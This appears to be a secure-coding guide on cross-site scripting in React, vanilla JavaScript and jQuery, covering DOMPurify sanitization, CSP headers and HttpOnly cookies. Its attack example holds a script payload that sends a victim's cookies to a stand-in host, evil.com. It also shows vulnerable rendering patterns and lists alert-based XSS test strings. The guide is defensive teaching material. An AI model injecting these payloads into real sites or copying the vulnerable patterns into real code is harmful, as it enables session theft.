# Issue 03: Cross-Site Scripting (XSS) - Trusting User Input

> **Severity:** HIGH  
> **Category:** Security  
> **OWASP:** A03:2021 - Injection (XSS)

---

## Problem

XSS occurs when user-supplied data is rendered in a browser without sanitization. AI-generated code often directly inserts user content into HTML, allowing attackers to execute malicious scripts in other users' browsers.

### Vulnerable Pattern (DO NOT USE)

```jsx
// ❌ VULNERABLE - React with dangerouslySetInnerHTML
function Comment({ comment }) {
    return <div dangerouslySetInnerHTML={{ __html: comment.text }} />
}

// ❌ VULNERABLE - Vanilla JS innerHTML
document.getElementById('comment').innerHTML = userInput;

// ❌ VULNERABLE - document.write
document.write('<p>' + userInput + '</p>');

// ❌ VULNERABLE - jQuery html()
$('#comment').html(userInput);
```

### Attack Example

```
If comment.text is:
<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>

Every user viewing that comment has their session stolen.
```

---

## Expected Behavior

All user-supplied content must be sanitized before rendering. Use framework defaults (React auto-escaping) or sanitization libraries (DOMPurify) when HTML rendering is required.

### Secure Pattern (USE THIS)

```jsx
// ✅ SECURE - React default text escaping (PREFERRED)
function Comment({ comment }) {
    return <div>{comment.text}</div>  // React auto-escapes
}

// ✅ SECURE - When HTML is required, use DOMPurify
import DOMPurify from 'dompurify';

function Comment({ comment }) {
    const sanitized = DOMPurify.sanitize(comment.text);
    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />
}

// ✅ SECURE - Vanilla JS with textContent
document.getElementById('comment').textContent = userInput;
```

---

## Three Types of XSS

| Type | How It Works | AI Risk |
|------|--------------|---------|
| **Stored XSS** | Malicious script saved in database, served to all users | High - AI generates forms that save raw input |
| **Reflected XSS** | Malicious script in URL parameter reflected in page | High - AI generates search/filter without encoding |
| **DOM-based XSS** | Client-side JS manipulates DOM unsafely | Medium - AI uses innerHTML, document.write |

---

## Fix Instructions

### Step 1: Audit for dangerous patterns

```bash
# Find dangerouslySetInnerHTML in React
grep -rn "dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx" --include="*.js"

# Find innerHTML assignments
grep -rn "\.innerHTML\s*=" --include="*.js" --include="*.jsx" --include="*.ts" --include="*.tsx"

# Find document.write
grep -rn "document\.write" --include="*.js" --include="*.jsx"

# Find jQuery html()
grep -rn "\.html(" --include="*.js" --include="*.jsx"

# Find v-html in Vue
grep -rn "v-html" --include="*.vue"
```

### Step 2: Install DOMPurify (for cases requiring HTML)

```bash
npm install dompurify
npm install --save-dev @types/dompurify  # TypeScript
```

### Step 3: Create sanitization utility

```typescript
// utils/sanitize.ts
import DOMPurify from 'dompurify';

// Strict sanitization - only safe formatting tags
const ALLOWED_TAGS = ['p', 'b', 'i', 'a', 'br', 'ul', 'ol', 'li'];
const ALLOWED_ATTR = ['href', 'rel', 'target'];

export function sanitizeHTML(dirty: string): string {
    return DOMPurify.sanitize(dirty, {
        ALLOWED_TAGS,
        ALLOWED_ATTR,
        ALLOW_DATA_ATTR: false,
    });
}

// For links - force safe attributes
export function sanitizeLink(url: string): string {
    // Only allow http, https, mailto protocols
    const allowed = /^(https?:|mailto:)/i;
    if (!allowed.test(url)) {
        return '#';
    }
    return url;
}

// Plain text only - strip ALL HTML
export function stripHTML(dirty: string): string {
    return DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });
}
```

### Step 4: Refactor vulnerable components

**Before:**
```jsx
// ❌ VULNERABLE
function UserComment({ comment }) {
    return (
        <div className="comment">
            <div dangerouslySetInnerHTML={{ __html: comment.text }} />
            <a href={comment.authorUrl}>View Profile</a>
        </div>
    );
}
```

**After:**
```jsx
// ✅ SECURE
import { sanitizeHTML, sanitizeLink } from '@/utils/sanitize';

function UserComment({ comment }) {
    return (
        <div className="comment">
            {/* Option A: Plain text (preferred) */}
            <div>{comment.text}</div>
            
            {/* Option B: If rich text needed */}
            <div 
                dangerouslySetInnerHTML={{ 
                    __html: sanitizeHTML(comment.text) 
                }} 
            />
            
            {/* Sanitize user-provided URLs */}
            <a 
                href={sanitizeLink(comment.authorUrl)}
                rel="noopener noreferrer"
                target="_blank"
            >
                View Profile
            </a>
        </div>
    );
}
```

### Step 5: Implement Content Security Policy (CSP)

Add CSP headers to prevent inline script execution even if XSS exists:

```typescript
// next.config.js (Next.js)
const securityHeaders = [
    {
        key: 'Content-Security-Policy',
        value: [
            "default-src 'self'",
            "script-src 'self'",  // No 'unsafe-inline'!
            "style-src 'self' 'unsafe-inline'",  // Inline styles often needed
            "img-src 'self' data: https:",
            "font-src 'self'",
            "connect-src 'self'",
            "frame-ancestors 'none'",
        ].join('; ')
    }
];

module.exports = {
    async headers() {
        return [
            {
                source: '/(.*)',
                headers: securityHeaders,
            },
        ];
    },
};
```

```python
# FastAPI middleware
from fastapi import FastAPI
from starlette.middleware import Middleware
from starlette.middleware.base import BaseHTTPMiddleware

class CSPMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:;"
        )
        return response

app = FastAPI()
app.add_middleware(CSPMiddleware)
```

### Step 6: Set HttpOnly cookies

Prevent JavaScript access to session cookies:

```python
# FastAPI/Starlette
response.set_cookie(
    key="session",
    value=token,
    httponly=True,      # Cannot be accessed via document.cookie
    secure=True,        # HTTPS only
    samesite="strict"   # CSRF protection
)
```

```javascript
// Express.js
res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
});
```

---

## Defense Layers

Implement all four layers for defense in depth:

1. **Input validation** - Reject or strip HTML tags at input time
2. **Output encoding** - Escape special characters when rendering
3. **Content Security Policy** - Browser-level script execution controls
4. **HttpOnly cookies** - Prevent JavaScript access to session cookies

---

## Verification Checklist

After applying fixes, verify each item:

- [ ] **No raw `dangerouslySetInnerHTML`** - All uses wrapped with DOMPurify
- [ ] **No `innerHTML` assignments** with user data
- [ ] **No `document.write`** with user data
- [ ] **React components use text nodes** `{variable}` not HTML injection
- [ ] **DOMPurify configured** with whitelist of safe tags only
- [ ] **User-provided URLs sanitized** - No `javascript:` protocol
- [ ] **CSP headers configured** - No `unsafe-inline` for scripts
- [ ] **Session cookies are HttpOnly** - Check in browser DevTools

---

## Test Procedure

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Submit comment: `<script>alert('xss')</script>` | Script tags stripped or escaped, no alert |
| 2 | Submit comment: `<img src=x onerror=alert('xss')>` | Event handler stripped, no alert |
| 3 | Submit link: `javascript:alert('xss')` | Link replaced with `#` or rejected |
| 4 | Check CSP header in Network tab | Header present, no `unsafe-inline` for scripts |
| 5 | Check session cookie in DevTools | HttpOnly flag is true |
| 6 | Submit: `<a href="https://safe.com">link</a>` | Link renders (if allowed) with `rel="noopener"` |

---

## Files Likely Affected

- `components/` - Any component rendering user content
- `pages/` or `app/` - Page components with dynamic content
- `utils/` - Add sanitization utilities
- `next.config.js` or `middleware.ts` - CSP headers
- `lib/auth/` - Cookie configuration

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [React Security Best Practices](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
